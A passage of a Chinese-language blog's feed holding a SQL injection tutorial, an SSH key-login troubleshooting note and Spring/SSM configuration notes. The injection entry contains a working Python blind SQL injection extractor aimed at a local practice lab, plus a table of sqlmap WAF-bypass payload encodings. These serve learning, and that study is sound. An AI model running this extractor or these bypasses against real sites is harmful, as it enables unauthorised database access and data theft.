class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_table = <span class="string">"""select group_concat(distinct table_name) from """</span> + \</span><br><span class="line">                         <span class="string">"""information_schema.columns where table_schema=database()"""</span></span><br><span class="line">        self.get_database = <span class="string">"""select database()"""</span></span><br><span class="line">        self.get_version = <span class="string">"""select @@version"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success_by_boolen</span><span class="params">(get_url)</span>:</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">"User-Agent"</span>: ua.random&#125;</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    success = <span class="string">"Your Login name"</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success_by_time</span><span class="params">(get_url)</span>:</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">"User-Agent"</span>: ua.random&#125;</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    offset = after_time - before_time</span><br><span class="line">    success = <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> success &lt; offset:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_fun</span><span class="params">(sql_fun)</span>:</span></span><br><span class="line">    url = <span class="string">r"""http://localhost/sqlilabs/practice/example1.php?id=1' and (&#123;0&#125;) --+"""</span></span><br><span class="line">    <span class="comment"># Timing-based Blind SQL Attacks</span></span><br><span class="line">    <span class="comment"># url = r"""http://localhost/sqlilabs/practice/example1.php?id=1' and if((&#123;0&#125;),sleep(10),0) --+"""</span></span><br><span class="line"></span><br><span class="line">    _long = <span class="number">-1</span></span><br><span class="line">    out = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999</span>, <span class="number">1</span>):</span><br><span class="line">        sql = <span class="string">"""LENGTH((&#123;0&#125;))=&#123;1&#125;"""</span>.format(sql_fun, i)</span><br><span class="line">        <span class="keyword">if</span> is_success_by_boolen(url.format(sql)):</span><br><span class="line">            _long = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, _long, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:<span class="comment">#<span class="doctag">TODO:</span> 二分法优化</span></span><br><span class="line">            sql = <span class="string">"""(substr((&#123;0&#125;),&#123;1&#125;,1))=("&#123;2&#125;")"""</span>.format(sql_fun, i, j)</span><br><span class="line">            <span class="keyword">if</span> is_success_by_boolen(url.format(sql)):</span><br><span class="line">                out += <span class="string">''</span> + j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"&#123;0&#125;:  &#123;1&#125;"</span>.format(Example().get_version, sql_fun(Example().get_version))</span><br></pre></td></tr></table></figure></p><h1 id="我选择sqlmap"><a href="#我选择sqlmap" class="headerlink" title="我选择sqlmap"></a>我选择sqlmap</h1><p>sqlmap内置有万能的脚本,对于黑盒测试值得使用.</p><table><thead><tr><th>脚本</th><th>直译</th><th>备注</th></tr></thead><tbody><tr><td>apostrophemask</td><td>单引号伪装</td><td>使用<em>UTF-8</em></td></tr><tr><td>apostrophenullencode</td><td>单引号null编码</td><td>用双字节的unicode字符</td></tr><tr><td>appendnullbyte</td><td>尾部添加null字节</td><td></td></tr><tr><td>base64encode</td><td>base64编码</td></tr><tr><td>between</td><td>即<em>between</em></td><td>替换 <em>&lt;</em> <em>=</em> <em>&gt;</em></td></tr><tr><td>bluecoat</td><td>bypass Blue Coat Systems</td><td>老外的公司</td></tr><tr><td>chardoubleencode</td><td>字符两次编码</td><td>即两次url编码</td></tr><tr><td>charencode</td><td>…</td><td></td></tr><tr><td>charunicodeencode</td><td>字符unicode编码</td><td>即 <em>%uxxxx</em> 编码</td></tr><tr><td>charunicodeescape</td><td>字符unicode转义</td><td>即 <em>\uxxxx</em> 编码</td></tr><tr><td>commalessmid</td><td>mid更少的逗号</td><td>MID(A,B,C) –&gt; MID(A FROM B FOR C)</td></tr><tr><td>commalesslimit</td><td>limit更少的逗号</td><td>LIMIT M, N –&gt; LIMIT N OFFSET M</td></tr><tr><td>commentbeforeparentheses</td><td>括号之前注释</td><td></td></tr><tr><td>concat2concatws</td><td>concat –&gt; concat_ws</td><td></td></tr><tr><td>equaltolike</td><td><em>=</em> –&gt; <em>like</em></td><td></td></tr><tr><td>escapequotes</td><td>转义引号</td><td>引号前面加 <strong>\\</strong>  (意义?)</td></tr><tr><td>greatest</td><td>GREATEST()</td><td>返回参数的最大值,用于替换<em>and</em>后的 <em>&gt;</em></td></tr><tr><td>halfversionedmorekeywords</td><td><em>更多的关键字在一半的版本上</em>(?)</td><td>即加注释,如 <em>/\</em>!0UNION*<br>(MySQL &lt; 5.1)</td></tr><tr><td>htmlencode</td><td>html编码</td><td>即 <em>&#xx;</em> 编码</td></tr><tr><td>ifnull2casewhenisnull</td><td>IFNULL() –&gt;CASE WHEN ISNULL()</td><td>没见过的操作</td></tr><tr><td>ifnull2ifisnull</td><td>IFNULL()–&gt;IF ISNULL()</td><td>…</td></tr><tr><td>informationschemacomment</td><td>information_schema注释</td><td>information_schema/**/.table</td></tr><tr><td>least</td><td>LEAST()</td><td>返回参数的最小值,用于替换<em>and</em>后的 <em>&gt;</em></td></tr><tr><td>lowercase</td><td>小写</td><td></td></tr><tr><td>modsecurityversioned</td><td><em>ModSecurity版本</em>(?)</td><td>开源的WAF</td></tr><tr><td>modsecurityzeroversioned</td><td><em>ModSecurity零版本</em>(?)</td><td>..</td></tr><tr><td>multiplespaces</td><td>多个空格</td><td>就是瞎鸡儿加空格</td></tr><tr><td>nonrecursivereplacement</td><td>非递归替换</td><td>union –&gt; uni<strong>union</strong>on</td></tr><tr><td>overlongutf8</td><td>超长的UTF-8</td><td>即 <em>%xx%xx</em> 编码(不转换字母)</td></tr><tr><td>overlongutf8more</td><td>更长的UTF-8</td><td>即 <em>%xx%xx</em> 编码…(转换字母)</td></tr><tr><td>percentage</td><td>百分号</td><td>select –&gt; S%E%L%E%C%T</td></tr><tr><td>plus2concat</td><td>+ –&gt; CONCAT()</td><td>适用于(char(x)+char(x))</td></tr><tr><td>plus2fnconcat</td><td>+ –&gt; {fn CONCAT()}</td><td>ODBC only</td></tr><tr><td>randomcase</td><td>随机大小写</td><td></td></tr><tr><td>randomcomments</td><td>随机注释</td><td><strong>/**/</strong></td></tr><tr><td>securesphere</td><td>SecureSphere</td><td>WAF</td></tr><tr><td>sp_password</td><td>sp_password</td><td>日志</td></tr><tr><td>space2*</td><td>spacee -&gt; *</td></tr><tr><td>symboliclogical</td><td>逻辑符号</td><td>AND/OR -&gt; &amp;&amp;/&Iota;&Iota;</td></tr><tr><td>unionalltounion</td><td>union all -&gt; union</td><td></td></tr><tr><td>unmagicquotes</td><td>魔术引号</td><td>即%bf%27,神奇的<strong>縗’</strong></td></tr><tr><td>uppercase</td><td>大写</td><td></td></tr><tr><td>varnish</td><td>Varnish</td><td>WAF</td></tr><tr><td>versionedkeywords</td><td><em>版本的关键字</em>(?)</td><td>即/!*select/,不包括函数</td></tr><tr><td>versionedmorekeywords</td><td><em>更多的版本的关键字</em>(?)</td><td>即/!*select/,包括函数</td></tr><tr><td>xforwardedfor</td><td>X-Forwarded-For</td><td></td></tr></tbody></table><h1 id="我选择”啊D”"><a href="#我选择”啊D”" class="headerlink" title="我选择”啊D”"></a>我选择”啊D”</h1><p>是…是大佬呢…</p><!--小弟我对大佬你的景仰犹如滔滔江水连绵不绝又如黄河泛滥一发不可收拾天地可证日月可鉴。--><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a><p style="font-size:16px">参考链接:</p></h1><p><a href="https://mariadb.com/kb/en/library/string-functions/" target="_blank" rel="noopener">Sql中操纵字符串的函数方法</a></p><p><a href="https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423" target="_blank" rel="noopener">SQLMap Tamper Scripts (SQL Injection and WAF bypass)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.&lt;/p&gt;
&lt;p&gt;SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐&lt;/p&gt;
&lt;h1 id=&quot;我选择IE6&quot;&gt;&lt;a href=&quot;#我选择IE6&quot; class=&quot;headerlink&quot; title=&quot;我选择IE6&quot;&gt;&lt;/a&gt;我选择IE6&lt;/h1&gt;&lt;p&gt;有比在IE里面上网冲浪更快乐的事情么?&lt;br&gt;
    
    </summary>
    
    
      <category term="security" scheme="http://blog.qwerdf.com/tags/security/"/>
    
      <category term="sql" scheme="http://blog.qwerdf.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>记一次诡异的ssh密钥登录失败</title>
    <link href="http://blog.qwerdf.com/2018/03/31/unable-login-SSH-with-key/"/>
    <id>http://blog.qwerdf.com/2018/03/31/unable-login-SSH-with-key/</id>
    <published>2018-03-30T17:21:55.000Z</published>
    <updated>2018-03-30T19:03:24.604Z</updated>
    
    <content type="html"><![CDATA[<p>问基友要了台服务器,密码与密钥均不能登陆.改了密码后可以登陆,但密钥依然不能登陆.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_19_31_centos ~]<span class="comment"># ls -al                               </span></span><br><span class="line">total 80                                                       </span><br><span class="line">drwxrwxrwx.  3 root root  4096 Mar 30 23:50 .                  </span><br><span class="line">dr-xr-xr-x. 24 root root  4096 Mar 30 23:51 ..</span><br><span class="line">-rwxrwxrwx   1 root root   790 Mar 31 00:07 .bash_history      </span><br><span class="line">-rwxrwxrwx.  1 root root    18 May 20  2009 .bash_logout       </span><br><span class="line">-rwxrwxrwx.  1 root root   176 May 20  2009 .bash_profile      </span><br><span class="line">-rwxrwxrwx.  1 root root   176 Sep 23  2004 .bashrc            </span><br><span class="line">-rwxrwxrwx.  1 root root   100 Sep 23  2004 .cshrc             </span><br><span class="line">-rwxrwxrwx.  1 root root 12754 Dec 25  2014 install.log        </span><br><span class="line">-rwxrwxrwx.  1 root root  5520 Dec 25  2014 install.log.syslog      </span><br><span class="line">drwxrwxrwx   2 root root  4096 Mar 30 23:50 .ssh               </span><br><span class="line">-rwxrwxrwx.  1 root root   129 Dec  4  2004 .tcshrc            </span><br><span class="line">-rwxrwxrwx   1 root root  1005 Mar 30 23:50 .viminfo           </span><br><span class="line">[root@VM_19_31_centos ~]<span class="comment"># cd .ssh/</span></span><br><span class="line">[root@VM_19_31_centos .ssh]<span class="comment"># ls -al                            </span></span><br><span class="line">total 12                                                       </span><br><span class="line">drwxrwxrwx  2 root root 4096 Mar 30 23:50 .                    </span><br><span class="line">drwxrwxrwx. 3 root root 4096 Mar 30 23:50 ..                   </span><br><span class="line">-rwxrwxrwx  1 root root 1157 Mar 31 00:08 authorized_keys</span><br></pre></td></tr></table></figure><p>明显<em>.ssh/</em>与<em>authorized_keys</em>权限设置错误,改之</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>退出登录,然而依然不能用密钥登陆…<br><a id="more"></a><br>猜测是<em>sshd</em>配置问题.去sshd_config查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RSAAuthentication yes</span></span><br><span class="line"><span class="comment">#PubkeyAuthentication yes</span></span><br><span class="line"><span class="comment">#AuthorizedKeysFile       .ssh/authorized_keys</span></span><br></pre></td></tr></table></figure><p>取消注释,重启sshd服务,退出登录,问题依旧……<br>谷歌之,用<em>ssh -vv server</em>来查看登陆日志,发现报<em>we did not send a packet, disable method</em><br><img src="/uploads/2018-03-31_1.png" alt="we did not send a packet, disable method"><br>谷歌之,发现是<em>~</em>的权限设置<a href="https://unix.stackexchange.com/questions/205842/unable-to-login-with-ssh-rsa-key" target="_blank" rel="noopener">问题</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 ~</span><br></pre></td></tr></table></figure><p>退出登录,问题解决😂</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;问基友要了台服务器,密码与密钥均不能登陆.改了密码后可以登陆,但密钥依然不能登陆.&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[root@VM_19_31_centos ~]&lt;span class=&quot;comment&quot;&gt;# ls -al                               &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;total 80                                                       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drwxrwxrwx.  3 root root  4096 Mar 30 23:50 .                  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dr-xr-xr-x. 24 root root  4096 Mar 30 23:51 ..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx   1 root root   790 Mar 31 00:07 .bash_history      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root    18 May 20  2009 .bash_logout       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root   176 May 20  2009 .bash_profile      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root   176 Sep 23  2004 .bashrc            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root   100 Sep 23  2004 .cshrc             &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root 12754 Dec 25  2014 install.log        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root  5520 Dec 25  2014 install.log.syslog      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drwxrwxrwx   2 root root  4096 Mar 30 23:50 .ssh               &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx.  1 root root   129 Dec  4  2004 .tcshrc            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx   1 root root  1005 Mar 30 23:50 .viminfo           &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@VM_19_31_centos ~]&lt;span class=&quot;comment&quot;&gt;# cd .ssh/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[root@VM_19_31_centos .ssh]&lt;span class=&quot;comment&quot;&gt;# ls -al                            &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;total 12                                                       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drwxrwxrwx  2 root root 4096 Mar 30 23:50 .                    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drwxrwxrwx. 3 root root 4096 Mar 30 23:50 ..                   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-rwxrwxrwx  1 root root 1157 Mar 31 00:08 authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;明显&lt;em&gt;.ssh/&lt;/em&gt;与&lt;em&gt;authorized_keys&lt;/em&gt;权限设置错误,改之&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chmod 700 ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chmod 600 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;退出登录,然而依然不能用密钥登陆…&lt;br&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>SSM</title>
    <link href="http://blog.qwerdf.com/2018/03/16/ssm/"/>
    <id>http://blog.qwerdf.com/2018/03/16/ssm/</id>
    <published>2018-03-16T07:13:38.000Z</published>
    <updated>2018-03-30T19:22:56.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSM"><a href="#SSM" class="headerlink" title="SSM:"></a>SSM:</h1><p>即是<strong>S</strong>pring <strong>S</strong>pringMVC <strong>M</strong>ybatis的开头字母</p><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p><img src="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle/images/spring-overview.png" alt="Spring Framework Runtime"></p><p><strong>S</strong>SM里的Spring其实主要常用的是IoC和Aop,还有Test</p><ul><li>Spring默认的xml配置文件为 <em>applicationContext.xml</em></li></ul><h2 id="Spring-IoC"><a href="#Spring-IoC" class="headerlink" title="Spring IoC"></a>Spring IoC</h2><p>中文译名:控制反转/依赖注入,简单来说,即是原来的<code>new xxx();</code>用spring中content的bean代替,实现在构造函数的时候自动注入参数,有三种配置方式:基于xml,基于注解,基于java类,有三种注入方式:构造注入,set注入,工厂注入(不常用).<br><a id="more"></a></p><h3 id="基于xml的配置"><a href="#基于xml的配置" class="headerlink" title="基于xml的配置"></a>基于xml的配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--标识符(identifiers)即bean的身份标识--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--若不设定id与name,则以name-generator的规则命名,默认为小写开头的非限定类名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--若设定了id(一般情况),则id为标识符--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--若没设定,则name的第一个字符串作为标识符--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"info"</span> <span class="attr">name</span>=<span class="string">"informationX,name2"</span> <span class="attr">class</span>=<span class="string">"com.test.InformationX"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;bean id="nameX" value="lester"&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--setter注入,human需要有setname()&amp;setinfo()--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"human"</span> <span class="attr">class</span>=<span class="string">"com.test.pojo.human"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"lester"</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"info"</span> <span class="attr">ref</span>=<span class="string">"info"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--构造注入,man需要有man(human h,int age)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"man"</span> <span class="attr">class</span>=<span class="string">"com.test.pojo.man"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor</span> <span class="attr">ref</span>=<span class="string">"human"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor</span> <span class="attr">value</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="基于注解的配置"><a href="#基于注解的配置" class="headerlink" title="基于注解的配置"></a>基于注解的配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span>  <span class="comment">//自动生成Bean. 与@Repository(用于DAO),@Service(用于Service),@Controller(用于Controller)作用相同</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">human</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//@Resource,@Inject原生标准注解也能识别,作用也差不多</span></span><br><span class="line">    <span class="meta">@Qualifier</span>(<span class="string">"info"</span>) <span class="comment">//若不能自动识别即可指定注入内容</span></span><br><span class="line">    <span class="keyword">private</span> InformationX infoX;</span><br><span class="line">    <span class="meta">@Autowired</span>      <span class="comment">//此处注解后无需setNameX函数了</span></span><br><span class="line">    <span class="keyword">private</span> String nameX;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">human</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@AutoWired     即可在变量上进行注解(无需setter函数),也可在setter方法上进行注解</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNameX</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nameX=s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@Required     若设置Required则表示此变量必须在xml配置文件中进行配置</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setInfomationX</span><span class="params">(InfomationX x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.infoX=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//========================================================</span></span><br><span class="line">    <span class="comment">// 也可以在构造函数上注入</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">human</span><span class="params">(String s,@Qualifier(<span class="string">"info"</span>)</span>InfomationX x)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nameX=s;</span><br><span class="line">        <span class="keyword">this</span>.infoX=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//========================================================</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还要在Spring的xml配置文件中配置以使注解生效</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor"</span>/&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 使@Autowired可用" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.annotation.CommonAnnotationBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使Common(@Resource,@PostConstruct,@PreDestroy)可用(?) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.annotation.RequiredAnnotationBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使@Required可用" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span 